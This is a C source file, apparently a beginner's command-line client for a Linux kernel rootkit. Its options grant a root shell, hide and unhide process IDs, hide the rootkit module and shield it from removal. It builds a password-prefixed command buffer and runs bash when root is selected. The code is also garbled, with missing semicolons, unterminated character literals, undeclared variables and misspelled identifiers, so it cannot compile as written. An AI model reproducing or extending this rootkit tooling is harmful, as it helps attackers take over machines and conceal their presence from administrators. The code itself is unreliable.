#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <string.h>
#include <fcntl.h>
#include "config.h"


void printHelp(char **argv){
    printf(
            "Usage: %s [OPTION]...\n"
            "\n"
            "Options:\n"
            "  --root-shell            Grants you root shell access.\n"
            "  --hide-pid=PID          Hides the specified PID.\n"
            "  --unhide-pid=PID        Unhides the specified PID.\n"
//            "  --hide-file=FILENAME    Hides the specified FILENAME globally.\n"
//            "                          Must be a filename without any path.\n"
//            "  --unhide-file=FILENAME  Unhides the specified FILENAME.\n"
            "  --hide                  Hides the rootkit LKM.\n"
            "  --unhide                Unhides the rootkit LKM.\n"
            "  --help                  Print this help message.\n"
            "  --protect               Protects the rootkit from rmmod.\n"
            "  --unprotect             Disables the rmmod protection.\n\n", argv[0]);
}

void handle_command(int argc, char **argv, int *root, int *hide_pid,
                    int *unhide_pid, char **pid,int *hide, int *unhide,
                    int *protect, int *unprotect){

    if (argc < 2) {
        fprintf(stderr, "Error: No arguments provided.\n\n");
        printHelp(argv);
        exit(1);
    } else if (argc > 2){
        fprintf(stderr, "Error: Exactly one option should be specified\n\n");
        printHelp(argv);
        exit(1);
    }

    /***
     * If getopt() does not recognize an option character, it prints an error
     * message to stderr, stores the character in optopt, and returns '?'. The
     * calling program may prevent the error message by setting opterr to 0
     ***/

    opterr = 0;

    // Wooow, what's an option
    static struct option long_options[] ={
            {"root-shell",  no_argument,       0,    'a'},
            {"hide-pid",    required_argument, 0,    'b'},
            {"unhide-pid",  required_argument, 0,    'c'},
            {"hide",        no_argument,       0,    'f'},
            {"unhide",      no_argument,       0,    'g'},
            {"help",        no_argument,       0,    'h'},
            {"protect",     no_argument,       0,    'i'},
            {"unprotect",   no_argument,       0,    'j'},
            {0,             0,                 0,      0}
    };

    *root = 0;
    *hide_pid = 0;
    *unhide_pid = 0;
    *pid = NULL
    *hide = 0;
    *unhide = 0;
    *help = 0;
    *protect = 0;
    *unprotect = 0;

    int opt;
    while ((opt = getopt_long(argc, argv, ":", long_options, NULL)) != -1){
//        printf("In the helper command: ");
        switch (opt){
            case 'a':
                *root = 1;
                printf("Root");
                break;
            case 'b:
                *hide_pid = 1;
                *pid = optarg;
                break;
            case 'c:
                *unhide_pid = 1;
                *pid = optarg;
                break
            case 'f':
                printf("hide");
                *hide = 1;
                break;
            case 'g':
                printf("unhide");
                *unhide = 1;
                break;
            case 'h':
                printHelp(argv)
                exit(0);
            case 'i':
                *proctect = 1;
                break;
            case 'j':
                *unproctect = 1;
                break;
            case '?':
                fprintf(stderr, "Error: Unrecognised option %s\n\n", argv[optind - 1]);
                printHelp(argv);
                exit(1);
            case ':':
                fprintf(stderr, "Error: Unrecognised option %s\n\n", argv[optind - 1]);
                printHelp(argv);
                exit(1);
        }
    }

}

void write_buffer(char **dest_ptr,  char *src, size_t size){
    printf("\nIn write buffer, dest char is:%zu", dest_ptr);
    // What is memcpy?? It look like memory copy
    memcpy(*dest_ptr, src, size);
    *dest_ptr += size;
    printf("\nNow dest ptr: %zu", dest_ptr);
}

void pointer_example(){
    int i = 25;
    int *ptr = &i;

    printf("The value of i(*ptr):%d", *ptr);
    printf("\nThe address of i(*ptr):%p", ptr);
    printf("\nThe value of i: %d", i);
    printf("\nThe address of i(&i):%p", &i);
    printf("\nThe address of ptr(&ptr):%p", &ptr);
}

int main(int argc, char **argv) {
    int root;
    int hide_pid;
    int unhide_pid;
    char *pid;
    int hide;
    int unhide;
    int protect;
    int unprotect;
//    char[10] test = "Iamfive"; // this is 7 characters
//    size_t size = sizeof(test);
//    printf("Size is: %zu", size);


//    printf("\nThe address of root: %p", &root);
//    printf("\nThe address of hide: %p", &hide);
//    printf("\nThe address of unhide: %p", &unhide);

    handle_command(argc, argv, &root, &hide_pid, &unhide_pid, &pid,
            &hide, &unhide, &protect, &unprotect);

    size_t buf_size = 0;
    printf("\nInitial size_t: %zu", buf_size);
    buf_size += sizeof(CFG_PASS);
    // Where does the one come from ????
    printf("\nNew size_t: %zu", buf_size);

    if (root) {
        buf_size += sizeof(CFG_ROOT);
        printf("\nRoot size: %zu", buf_size);
    } else if(hide_pid) {
        buf_size += sizeof(CFG_HIDE_PID) + strlen(pid);
    }else if(unhide_pid){
        buf_size += sizeof(CFG_UNHIDE_PID) + strlen(pid);
    }else if (hide){
            buf_size += sizeof(CFG_HIDE);
            printf("\nHide size: %zu", buf_size);
    } else if (unhide){
        buf_size += sizeof(CFG_UNHIDE);
        printf("\nUnhide size: %zu", buf_size);
    } else if (protect) {
        buf_size += sizeof(CFG_PROTECT);
    } else if (unprotect) {
        buf_size += sizeof(CFG_UNPROTECT);
    }


    buf_size += 1; // for null terminator
    printf("\nBecause of null: %zu", buf_size);

    // What does malloc do???
    char *buf = malloc(buf_size);
//    printf("\nBuf size: %p", &buf);
    char *buf_ptr = buf;

    write_buffer(&buf_ptr, CFG_PASS, sizeof(CFG_PASS));
    if (root){
        write_buffer(&buf_ptr, CFG_ROOT, sizeof(CFG_ROOT));
    } else if (hide_pid) {
        write_buffer(&buf_ptr, CFG_HIDE_PID, sizeof(CFG_HIDE_PID));
        write_buffer(&buf_ptr, pid, strlen(pid));
    }else if (unhide_pid) {
        write_buffer(&buf_ptr, CFG_UNHIDE_PID, sizeof(CFG_UNHIDE_PID));
        write_buffer(&buf_ptr, pid, strlen(pid));
    } else if (hide){
        write_buffer(&buf_ptr, CFG_HIDE, sizeof(CFG_HIDE));
    } else if (unhide){
        write_buffer(&buf_ptr, CFG_UNHIDE, sizeof(CFG_UNHIDE));
    } else if (protect) {
        write_buffer(&buf_ptr, CFG_PROCTECT, sizeof(CFG_PROCTECT));
    } else if (unprotect) {
        write_buffer(&buf_ptr, CFG_UNPROTECT, sizeof(CFG_UNPROTECT));
    }

    if (root) {
        execl("/bin/bash", "bash", NULL);
    }

    return 0;
}